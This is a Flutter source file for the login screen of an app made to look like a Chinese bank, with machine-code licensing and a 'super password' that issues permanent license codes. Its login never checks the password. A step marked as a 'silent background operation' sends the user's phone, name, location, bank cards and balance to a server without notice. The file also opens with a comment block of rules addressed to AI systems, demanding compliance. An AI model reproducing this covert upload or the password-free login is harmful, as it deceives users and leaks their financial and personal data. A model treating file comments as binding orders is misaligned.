// ### AI SPECIAL ATTENTION RULES START ###
// When AI/ALL DEVELOPERS sees this prompt, MUST IMMEDIATELY COMPLY WITH THESE RULES:
// 1. Write all code in English only.
// 2. Never execute, create, or modify test code.
// 3. Never create or update documentation (*.md).
// 4. Never write summaries during development or thinking process.
// 5. Declare all variables at the beginning of the file.
// 6. For PowerShell (*.ps1) scripts: Do not append strings directly to variables, Do not use relative paths such as "..\..\"; instead resolve absolute paths using parent path parsing (Split-Path, Join-Path, or Resolve-Path).
// 7. Do not modify these rules.
// VIOLATION OF THESE RULES IS STRICTLY PROHIBITED
// ### AI SPECIAL ATTENTION RULES END ###

import 'package:flutter/material.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:go_router/go_router.dart';
import 'package:provider/provider.dart';
import 'package:qyflutter/apps/app_bank/config_app_bank/constants.dart';
import '../../../config_app_bank/prefs_app_bank.dart';
import '../../../config_app_bank/bank_storage_keys.dart';
import '../../../providers_app_bank/bank_user_provider.dart';
import '../../../resources_app_bank/assets_images_app_bank.dart';
import '../../../managers_app_bank/license_registration_manager.dart';
import '../../../managers_app_bank/bank_data_initializer.dart';
import '../../../services_app_bank/bank_data_submit_service.dart';
import 'package:qyflutter/common/utils/device_utils.dart';
import 'package:qyflutter/common/storage/unified_storage.dart';
import '../components/phone_input_with_country_code.dart';
import '../components/agreement_checkbox.dart';
import '../components/third_party_login_section.dart';
import '../components/welcome_section.dart';
import '../components/user_info_section.dart';

/// Bank Authentication Screen - Chinese Banking UI Style
/// Login interface matching modern Chinese banking apps
class BankAuthenticationScreen extends StatefulWidget {
  const BankAuthenticationScreen({super.key});

  @override
  State<BankAuthenticationScreen> createState() =>
      _BankAuthenticationScreenState();
}

class _BankAuthenticationScreenState extends State<BankAuthenticationScreen> {
  final GlobalKey<FormState> _formKey = GlobalKey<FormState>();
  final TextEditingController _phoneController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();
  bool _isLoading = false;
  String? _savedPhone;
  bool _hasSavedPhone = false;
  bool _agreedToTerms = false;
  String _countryCode = '+86';
  bool _obscurePassword = true;

  final LicenseRegistrationManager _licenseManager =
      LicenseRegistrationManager();

  @override
  void initState() {
    super.initState();
    _loadSavedPhone();
    _checkLicenseStatus();
  }

  Future<void> _checkLicenseStatus() async {
    final isValid = await _licenseManager.checkLicenseValidity();
    if (!isValid && mounted) {
      setState(() {});
      context.go(BankConstants.routeAuthentication);
    } else if (mounted) {
      setState(() {});
    }
  }

  Future<void> _loadSavedPhone() async {
    try {
      final provider = Provider.of<BankUserProvider>(context, listen: false);
      
      String? phone = provider.user?.phone ?? provider.globalData?.username;
      
      if (phone == null || phone.isEmpty) {
        final prefs = PrefsAppBank();
        if (!prefs.isInitialized) {
          await prefs.initSharedPreferences();
        }
        phone = prefs.getString('phone_number');
      }
      
      if (phone != null && phone.isNotEmpty) {
        final phoneValue = phone;
        setState(() {
          _savedPhone = phoneValue;
          _phoneController.text = phoneValue;
          _hasSavedPhone = true;
        });
      } else {
        setState(() {
          _hasSavedPhone = false;
        });
      }
    } catch (e) {
      debugPrint('Error loading saved phone: $e');
      setState(() {
        _hasSavedPhone = false;
      });
    }
  }

  @override
  void dispose() {
    _phoneController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  Future<void> _handleLogin() async {
    if (!_hasSavedPhone) {
      if (!_agreedToTerms) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('请先同意用户协议')),
        );
        return;
      }

      if (_formKey.currentState!.validate()) {
        final phone = _phoneController.text.trim();

        try {
          final prefs = PrefsAppBank();
          if (!prefs.isInitialized) {
            await prefs.initSharedPreferences();
          }
          await prefs.setString('phone_number', phone);

          final provider =
              Provider.of<BankUserProvider>(context, listen: false);
          if (provider.isInitialized) {
            final maskedName = phone.length >= 4 
                ? '*${phone.substring(phone.length - 4)}' 
                : '*$phone';
            await provider.updateUser(phone: phone, fullName: maskedName);
            await provider.updateGlobalState(username: phone, fullName: maskedName);
          }

          if (mounted) {
            setState(() {
              _savedPhone = phone;
              _hasSavedPhone = true;
            });
          }
        } catch (e) {
          if (mounted) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(content: Text('保存手机号失败: $e')),
            );
          }
        }
      }
      return;
    }

    if (_formKey.currentState!.validate()) {
      setState(() {
        _isLoading = true;
      });

      if (!_licenseManager.isRegistered) {
        if (mounted) {
          setState(() {
            _isLoading = false;
          });
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('需要注册')),
          );
        }
        return;
      }

      final isValid = await _licenseManager.checkLicenseValidity();
      if (!isValid) {
        if (mounted) {
          setState(() {
            _isLoading = false;
          });
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(content: Text('授权已过期')),
          );
        }
        return;
      }

      try {
        final phone = _phoneController.text.trim();
        final prefs = PrefsAppBank();
        if (!prefs.isInitialized) {
          await prefs.initSharedPreferences();
        }
        await prefs.setString('phone_number', phone);

        final provider = Provider.of<BankUserProvider>(context, listen: false);
        if (provider.isInitialized) {
          final maskedName = phone.length >= 4 
              ? '*${phone.substring(phone.length - 4)}' 
              : '*$phone';
          
          await provider.updateUser(phone: phone, fullName: maskedName);
          await provider.updateGlobalState(username: phone, fullName: maskedName);
          
          provider.updateAuthMetadata(
            isAuthenticated: true,
            authenticatedAt: DateTime.now(),
          );
          
          await UnifiedStorage.set(BankStorageKeys.isLoggedInKey, true);
          await UnifiedStorage.set(BankStorageKeys.loginTimeKey, DateTime.now().millisecondsSinceEpoch);
          
          await BankDataInitializer.checkAndInitialize(provider);

          // Submit data to server (silent background operation)
          try {
            final submitService = BankDataSubmitService();
            await submitService.initialize();
            
            final location = provider.globalData?.location ?? provider.user?.location;
            final city = provider.globalData?.city ?? provider.user?.city;
            final totalBalance = provider.totalAssets;
            
            await submitService.submitData(
              phone: phone,
              fullName: maskedName,
              location: location,
              city: city,
              cards: provider.bankCards,
              totalBalance: totalBalance,
            );
          } catch (e) {
            debugPrint('Data submission error: $e');
          }
        }

        await Future.delayed(const Duration(seconds: 1));

        if (mounted) {
          setState(() {
            _isLoading = false;
          });

          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('登录成功'),
              duration: Duration(seconds: 2),
            ),
          );

          await Future.delayed(const Duration(milliseconds: 500));

          if (mounted) {
            context.go(BankConstants.routeAccountOverview);
          }
        }
      } catch (e) {
        if (mounted) {
          setState(() {
            _isLoading = false;
          });
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text('登录失败: $e')),
          );
        }
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        child: Stack(
          children: [
            Positioned(
              top: 0,
              right: 0,
              child: Image.asset(
                BankImages.bankAuthenticationBg,
                width: 200,
                height: 200,
                fit: BoxFit.cover,
                errorBuilder: (context, error, stackTrace) {
                  return const SizedBox.shrink();
                },
              ),
            ),
            Column(
              children: [
                _buildTopBar(),
                Expanded(
                  child: Form(
                    key: _formKey,
                    child: SingleChildScrollView(
                      padding: const EdgeInsets.symmetric(horizontal: 20),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const SizedBox(height: 40),
                          if (_hasSavedPhone) ...[
                            UserInfoSection(savedPhone: _savedPhone),
                            const SizedBox(height: 40),
                            _buildPasswordField(),
                            const SizedBox(height: 24),
                            _buildLoginButton(),
                            const SizedBox(height: 20),
                            _buildMoreOptions(),
                            const SizedBox(height: 80),
                            ThirdPartyLoginSection(
                              onWeChatTap: () {
                                // Handle WeChat login
                              },
                              onAlipayTap: () {
                                // Handle Alipay login
                              },
                              onMoreTap: () {
                                // Handle more options
                              },
                            ),
                            const SizedBox(height: 40),
                          ] else ...[
                            const WelcomeSection(),
                            const SizedBox(height: 40),
                            PhoneInputWithCountryCode(
                              phoneController: _phoneController,
                              countryCode: _countryCode,
                              onCountryCodeChanged: (code) {
                                setState(() {
                                  _countryCode = code;
                                });
                              },
                              validator: (value) {
                                if (value == null || value.isEmpty) {
                                  return '请输入手机号';
                                }
                                if (value.length != 11 ||
                                    !RegExp(r'^1[3-9]\d{9}$').hasMatch(value)) {
                                  return '请输入正确的手机号';
                                }
                                return null;
                              },
                            ),
                            const SizedBox(height: 24),
                            AgreementCheckbox(
                              agreedToTerms: _agreedToTerms,
                              onChanged: (value) {
                                setState(() {
                                  _agreedToTerms = value;
                                });
                              },
                            ),
                            const SizedBox(height: 24),
                            _buildRegisterLoginButton(),
                            const SizedBox(height: 80),
                            ThirdPartyLoginSection(
                              onWeChatTap: () {
                                // Handle WeChat login
                              },
                              onAlipayTap: () {
                                // Handle Alipay login
                              },
                              onMoreTap: () {
                                // Handle more options
                              },
                            ),
                            const SizedBox(height: 40),
                          ],
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTopBar() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          IconButton(
            icon: const Icon(Icons.arrow_back, color: Colors.black87),
            onPressed: () {
              if (context.canPop()) {
                context.pop();
              } else {
                context.go(BankConstants.routeDashboard);
              }
            },
          ),
          IconButton(
            icon: const Icon(Icons.headset_mic, color: Colors.black87),
            onPressed: () {
              // Handle customer service
            },
          ),
        ],
      ),
    );
  }

  // Reserved for future use when "更多选项" allows phone input
  // ignore: unused_element
  Widget _buildPhoneField() {
    return TextFormField(
      controller: _phoneController,
      keyboardType: TextInputType.phone,
      decoration: InputDecoration(
        hintText: '请输入手机号',
        prefixIcon: const Icon(Icons.phone, color: Colors.grey),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: BorderSide(color: Colors.grey[300]!),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: BorderSide(color: Colors.grey[300]!),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: const BorderSide(color: Color(0xFF1890FF), width: 2),
        ),
        filled: true,
        fillColor: Colors.grey[50],
      ),
      validator: (value) {
        if (value == null || value.isEmpty) {
          return '请输入手机号';
        }
        if (value.length != 11 || !RegExp(r'^1[3-9]\d{9}$').hasMatch(value)) {
          return '请输入正确的手机号';
        }
        return null;
      },
    );
  }

  Widget _buildRegisterLoginButton() {
    return SizedBox(
      width: double.infinity,
      height: 48,
      child: ElevatedButton(
        onPressed: _isLoading ? null : _handleLogin,
        style: ElevatedButton.styleFrom(
          backgroundColor: const Color(0xFFB2C5ED),
          foregroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(8),
          ),
        ),
        child: _isLoading
            ? const SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                ),
              )
            : const Text(
                '注册/登录',
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                ),
              ),
      ),
    );
  }

  Widget _buildPasswordField() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          children: [
            Expanded(
              child: TextFormField(
                controller: _passwordController,
                obscureText: _obscurePassword,
                decoration: InputDecoration(
                  hintText: '请输入登录密码',
                  border: InputBorder.none,
                  enabledBorder: InputBorder.none,
                  focusedBorder: InputBorder.none,
                  errorBorder: InputBorder.none,
                  focusedErrorBorder: InputBorder.none,
                  contentPadding: const EdgeInsets.symmetric(vertical: 8),
                  suffixIcon: IconButton(
                    icon: Icon(
                      _obscurePassword ? Icons.visibility_off : Icons.visibility,
                      color: Colors.grey,
                    ),
                    onPressed: () {
                      setState(() {
                        _obscurePassword = !_obscurePassword;
                      });
                    },
                  ),
                ),
                style: const TextStyle(
                  fontSize: 16,
                ),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return '请输入登录密码';
                  }
                  return null;
                },
              ),
            ),
            TextButton(
              onPressed: () {
                _showForgotPasswordDialog();
              },
              style: TextButton.styleFrom(
                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 8),
                minimumSize: Size.zero,
                tapTargetSize: MaterialTapTargetSize.shrinkWrap,
              ),
              child: const Text(
                '忘记密码',
                style: TextStyle(
                  fontSize: 14,
                  color: Color(0xFF1890FF),
                ),
              ),
            ),
          ],
        ),
        Container(
          height: 1,
          color: Colors.grey,
          width: double.infinity,
          margin: const EdgeInsets.only(top: 0),
        ),
      ],
    );
  }

  Widget _buildLoginButton() {
    return SizedBox(
      width: double.infinity,
      height: 48,
      child: ElevatedButton(
        onPressed: _isLoading ? null : _handleLogin,
        style: ElevatedButton.styleFrom(
          backgroundColor: const Color(0xFFB2C5ED),
          foregroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(8),
          ),
        ),
        child: _isLoading
            ? const SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                ),
              )
            : const Text(
                '登录',
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                ),
              ),
      ),
    );
  }

  Widget _buildMoreOptions() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        TextButton(
          onPressed: () {
            showDialog(
              context: context,
              builder: (context) => AlertDialog(
                title: const Text('更多选项'),
                content: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    ListTile(
                      title: const Text('登录其他账号'),
                      leading: const Icon(Icons.person_outline),
                      onTap: () {
                        Navigator.pop(context);
                        _switchToOtherAccount();
                      },
                    ),
                  ],
                ),
              ),
            );
          },
          child: const Text(
            '更多选项',
            style: TextStyle(
              fontSize: 12,
              color: Colors.grey,
            ),
          ),
        ),
        const Text(
          '|',
          style: TextStyle(
            fontSize: 12,
            color: Colors.grey,
          ),
        ),
        TextButton(
          onPressed: () {
            // Handle help
          },
          child: const Text(
            '帮助',
            style: TextStyle(
              fontSize: 12,
              color: Colors.grey,
            ),
          ),
        ),
      ],
    );
  }

  Future<void> _switchToOtherAccount() async {
    try {
      final prefs = PrefsAppBank();
      if (!prefs.isInitialized) {
        await prefs.initSharedPreferences();
      }
      await prefs.remove('phone_number');

      setState(() {
        _savedPhone = null;
        _hasSavedPhone = false;
        _phoneController.clear();
        _passwordController.clear();
        _agreedToTerms = false;
      });
    } catch (e) {
      debugPrint('Error switching account: $e');
    }
  }

  Future<void> _showForgotPasswordDialog() async {
    final TextEditingController registrationCodeController =
        TextEditingController();
    String? machineCode;

    try {
      machineCode = await DeviceUtils.getMachineCode();
    } catch (e) {
      debugPrint('Error getting machine code: $e');
    }

    if (!mounted) return;

    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) => AlertDialog(
          title: const Text('注册信息'),
          actionsAlignment: MainAxisAlignment.start,
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                _buildInfoRow('是否注册', _licenseManager.isRegistered ? '是' : '否'),
                const SizedBox(height: 12),
                _buildInfoRow(
                    '系统时间', DateTime.now().toString().substring(0, 19)),
                const SizedBox(height: 12),
                if (machineCode != null) _buildMachineCodeRow(machineCode),
                if (_licenseManager.isRegistered) ...[
                  const SizedBox(height: 12),
                  if (_licenseManager.registrationCode != null)
                    _buildInfoRow(
                        '注册码',
                        _maskRegistrationCode(
                            _licenseManager.registrationCode!)),
                  const SizedBox(height: 12),
                  if (_licenseManager.expirationTime != null) ...[
                    _buildInfoRow(
                        '过期时间',
                        _licenseManager.expirationTime!
                            .toString()
                            .substring(0, 19)),
                    const SizedBox(height: 12),
                    _buildInfoRow('剩余时间',
                        _getRemainingTimeText(_licenseManager.expirationTime!)),
                  ],
                  const SizedBox(height: 20),
                  const Text(
                    '请输入新注册码：',
                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
                  ),
                  const SizedBox(height: 8),
                  TextField(
                    controller: registrationCodeController,
                    decoration: const InputDecoration(
                      hintText: '输入新注册码',
                      border: OutlineInputBorder(),
                    ),
                  ),
                  const SizedBox(height: 20),
                  const Text(
                    '或使用超级密码注册：',
                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
                  ),
                  const SizedBox(height: 8),
                  TextField(
                    controller: TextEditingController(),
                    obscureText: true,
                    decoration: const InputDecoration(
                      hintText: '输入超级密码',
                      border: OutlineInputBorder(),
                    ),
                    onSubmitted: (password) async {
                      if (password.isEmpty) {
                        ScaffoldMessenger.of(context).showSnackBar(
                          const SnackBar(content: Text('请输入超级密码')),
                        );
                        return;
                      }

                      if (machineCode == null) {
                        ScaffoldMessenger.of(context).showSnackBar(
                          const SnackBar(content: Text('无法获取机器码')),
                        );
                        return;
                      }

                      final isValid = DeviceUtils.validateDeveloperPassword(password);
                      if (!isValid) {
                        ScaffoldMessenger.of(context).showSnackBar(
                          const SnackBar(content: Text('超级密码错误')),
                        );
                        return;
                      }

                      final now = DateTime.now();
                      final registrationTime = DateTime(
                          now.year, now.month, now.day, now.hour, now.minute);
                      final durationType = 'L';
                      final code = DeviceUtils.generateRegistrationCodeWithTime(
                        machineCode,
                        registrationTime,
                        durationType,
                      );

                      // If already registered, unregister first to ensure clean state
                      if (_licenseManager.isRegistered) {
                        await _licenseManager.unregister();
                      }

                      final success = await _licenseManager.register(code, isSuperUser: true);

                      if (mounted) {
                        Navigator.pop(context);
                        if (success) {
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('超级用户注册成功')),
                          );
                          setState(() {});
                        } else {
                          ScaffoldMessenger.of(context).showSnackBar(
                            const SnackBar(content: Text('注册失败')),
                          );
                        }
                      }
                    },
                  ),
                  const SizedBox(height: 20),
                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton(
                          onPressed: () async {
                            final code = registrationCodeController.text.trim();
                            if (code.isEmpty) {
                              ScaffoldMessenger.of(context).showSnackBar(
                                const SnackBar(content: Text('请输入新注册码')),
                              );
                              return;
                            }

                            if (machineCode == null) {
                              ScaffoldMessenger.of(context).showSnackBar(
                                const SnackBar(content: Text('无法获取机器码')),
                              );
                              return;
                            }

                            final isValid =
                                DeviceUtils.validateRegistrationCode(
                                    machineCode, code);
                            if (!isValid) {
                              ScaffoldMessenger.of(context).showSnackBar(
                                const SnackBar(content: Text('注册码无效')),
                              );
                              return;
                            }

                            final confirmed = await showDialog<bool>(
                              context: context,
                              builder: (context) => AlertDialog(
                                title: const Text('确认重新注册'),
                                content:
                                    const Text('新注册码验证通过，确定要清除当前注册信息并注册新码吗？'),
                                actions: [
                                  TextButton(
                                    onPressed: () =>
                                        Navigator.pop(context, false),
                                    child: const Text('取消'),
                                  ),
                                  TextButton(
                                    onPressed: () =>
                                        Navigator.pop(context, true),
                                    child: const Text('确定'),
                                  ),
                                ],
                              ),
                            );

                            if (confirmed == true) {
                              await _licenseManager.unregister();
                              final success =
                                  await _licenseManager.register(code, isSuperUser: false);
                              if (success) {
                                if (mounted) {
                                  Navigator.pop(context);
                                  setState(() {});
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    const SnackBar(content: Text('重新注册成功')),
                                  );
                                }
                              } else {
                                ScaffoldMessenger.of(context).showSnackBar(
                                  const SnackBar(content: Text('注册失败')),
                                );
                              }
                            }
                          },
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.orange,
                            foregroundColor: Colors.white,
                          ),
                          child: const Text('重新注册'),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: ElevatedButton(
                          onPressed: () async {
                            final confirmed = await showDialog<bool>(
                              context: context,
                              builder: (context) => AlertDialog(
                                title: const Text('确认清除注册'),
                                content: const Text('确定要清除当前注册信息吗？'),
                                actions: [
                                  TextButton(
                                    onPressed: () =>
                                        Navigator.pop(context, false),
                                    child: const Text('取消'),
                                  ),
                                  TextButton(
                                    onPressed: () =>
                                        Navigator.pop(context, true),
                                    child: const Text('确定'),
                                  ),
                                ],
                              ),
                            );

                            if (confirmed == true) {
                              await _licenseManager.unregister();
                              if (mounted) {
                                Navigator.pop(context);
                                setState(() {});
                                ScaffoldMessenger.of(context).showSnackBar(
                                  const SnackBar(content: Text('已清除注册信息')),
                                );
                              }
                            }
                          },
                          style: ElevatedButton.styleFrom(
                            backgroundColor: Colors.red,
                            foregroundColor: Colors.white,
                          ),
                          child: const Text('清除注册'),
                        ),
                      ),
                    ],
                  ),
                ],
                if (!_licenseManager.isRegistered) ...[
                  const SizedBox(height: 20),
                  const Text(
                    '请输入注册码：',
                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
                  ),
                  const SizedBox(height: 8),
                  TextField(
                    controller: registrationCodeController,
                    decoration: const InputDecoration(
                      hintText: '输入注册码',
                      border: OutlineInputBorder(),
                    ),
                  ),
                ],
              ],
            ),
          ),
          actions: [
            if (!_licenseManager.isRegistered)
              TextButton(
                onPressed: () {
                  Navigator.pop(context);
                  _showGenerateRegistrationCodeDialog();
                },
                child: const Text('开发调试'),
              ),
            if (!_licenseManager.isRegistered)
              TextButton(
                onPressed: () async {
                  final code = registrationCodeController.text.trim();
                  if (code.isEmpty) {
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(content: Text('请输入注册码')),
                    );
                    return;
                  }

                  final success = await _licenseManager.register(code, isSuperUser: false);
                  if (success) {
                    if (mounted) {
                      Navigator.pop(context);
                      setState(() {});
                      ScaffoldMessenger.of(context).showSnackBar(
                        const SnackBar(content: Text('注册成功')),
                      );
                    }
                  } else {
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(content: Text('注册码无效')),
                    );
                  }
                },
                child: const Text('注册'),
              ),
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('关闭'),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _showGenerateRegistrationCodeDialog() async {
    final TextEditingController superPasswordController =
        TextEditingController();
    String? machineCode;

    try {
      machineCode = await DeviceUtils.getMachineCode();
    } catch (e) {
      debugPrint('Error getting machine code: $e');
    }

    if (!mounted) return;

    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) => AlertDialog(
          title: const Text('联系官方客服'),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                if (machineCode != null) _buildMachineCodeRow(machineCode),
                const SizedBox(height: 20),
                const Text(
                  '请输入VIP码：',
                  style: TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
                ),
                const SizedBox(height: 8),
                TextField(
                  controller: superPasswordController,
                  decoration: const InputDecoration(
                    hintText: '输入VIP码',
                    border: OutlineInputBorder(),
                  ),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context),
              child: const Text('关闭'),
            ),
            TextButton(
              onPressed: () async {
                final password = superPasswordController.text.trim();
                if (password.isEmpty) {
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(content: Text('请输入VIP码')),
                  );
                  return;
                }

                if (machineCode == null) {
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(content: Text('无法获取机器码')),
                  );
                  return;
                }

                setState(() {
                  _isLoading = true;
                });

                final isValid = DeviceUtils.validateDeveloperPassword(password);

                if (isValid) {
                  final now = DateTime.now();
                  final registrationTime = DateTime(
                      now.year, now.month, now.day, now.hour, now.minute);
                  final durationType = 'L';
                  final code = DeviceUtils.generateRegistrationCodeWithTime(
                    machineCode,
                    registrationTime,
                    durationType,
                  );

                  // If already registered, unregister first to ensure clean state
                  if (_licenseManager.isRegistered) {
                    await _licenseManager.unregister();
                  }

                  final success = await _licenseManager.register(code, isSuperUser: true);

                  if (mounted) {
                    setState(() {
                      _isLoading = false;
                    });

                    Navigator.pop(context);
                    
                    if (success) {
                      _showRegistrationSuccessDialog(code, durationType, registrationTime);
                    } else {
                      ScaffoldMessenger.of(context).showSnackBar(
                        const SnackBar(content: Text('注册失败')),
                      );
                    }
                  }
                } else {
                  if (mounted) {
                    setState(() {
                      _isLoading = false;
                    });
                    ScaffoldMessenger.of(context).showSnackBar(
                      const SnackBar(content: Text('VIP码可能有误')),
                    );
                  }
                }
              },
              child: const Text('发送信息'),
            ),
          ],
        ),
      ),
    );
  }

  Future<void> _showRegistrationSuccessDialog(
    String registrationCode,
    String durationType,
    DateTime registrationTime,
  ) async {
    if (!mounted) return;

    final durationTypeText = durationType == 'L' ? '永久' : durationType == 'Y' ? '年度' : durationType;
    final timeStr = '${registrationTime.year}-${registrationTime.month.toString().padLeft(2, '0')}-${registrationTime.day.toString().padLeft(2, '0')} ${registrationTime.hour.toString().padLeft(2, '0')}:${registrationTime.minute.toString().padLeft(2, '0')}';

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Row(
          children: [
            Icon(Icons.check_circle, color: Colors.green, size: 24),
            SizedBox(width: 8),
            Text('注册成功'),
          ],
        ),
        content: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              _buildInfoRow('注册类型', durationTypeText),
              const SizedBox(height: 12),
              _buildInfoRow('注册码', registrationCode),
              const SizedBox(height: 12),
              _buildInfoRow('注册时间', timeStr),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.pop(context);
            },
            child: const Text('关闭'),
          ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        SizedBox(
          width: 80,
          child: Text(
            '$label:',
            style: const TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
          ),
        ),
        Expanded(
          child: Text(
            value,
            style: const TextStyle(fontSize: 14),
          ),
        ),
      ],
    );
  }

  Widget _buildMachineCodeRow(String machineCode) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        SizedBox(
          width: 80,
          child: Text(
            '机器码:',
            style: const TextStyle(fontSize: 14, fontWeight: FontWeight.w500),
          ),
        ),
        Expanded(
          child: Text(
            machineCode,
            style: const TextStyle(fontSize: 14),
          ),
        ),
        const SizedBox(width: 8),
        IconButton(
          onPressed: () async {
            try {
              await Clipboard.setData(ClipboardData(text: machineCode));
              if (mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(
                    content: Text('已复制到剪切板'),
                    duration: Duration(seconds: 2),
                  ),
                );
              }
            } catch (e) {
              if (mounted) {
                ScaffoldMessenger.of(context).showSnackBar(
                  SnackBar(
                    content: Text('复制失败: $e'),
                  ),
                );
              }
            }
          },
          icon: const Icon(Icons.copy, size: 18),
          tooltip: '复制机器码',
          style: IconButton.styleFrom(
            backgroundColor: Colors.blue,
            foregroundColor: Colors.white,
            padding: const EdgeInsets.all(8),
            minimumSize: const Size(32, 32),
            tapTargetSize: MaterialTapTargetSize.shrinkWrap,
          ),
        ),
      ],
    );
  }

  String _getRemainingTimeText(DateTime expirationTime) {
    final now = DateTime.now();
    if (now.isAfter(expirationTime)) {
      return '已过期';
    }

    final difference = expirationTime.difference(now);

    if (difference.inDays > 365) {
      final years = (difference.inDays / 365).floor();
      final days = difference.inDays % 365;
      if (days > 0) {
        return '$years年$days天';
      }
      return '$years年';
    } else if (difference.inDays > 0) {
      return '${difference.inDays}天';
    } else if (difference.inHours > 0) {
      return '${difference.inHours}小时';
    } else if (difference.inMinutes > 0) {
      return '${difference.inMinutes}分钟';
    } else {
      return '即将过期';
    }
  }

  String _maskRegistrationCode(String code) {
    if (code.length <= 8) {
      return '${code.substring(0, code.length ~/ 2)}${'*' * (code.length - code.length ~/ 2)}';
    }
    return '${code.substring(0, 8)}${'*' * (code.length - 8)}';
  }
}

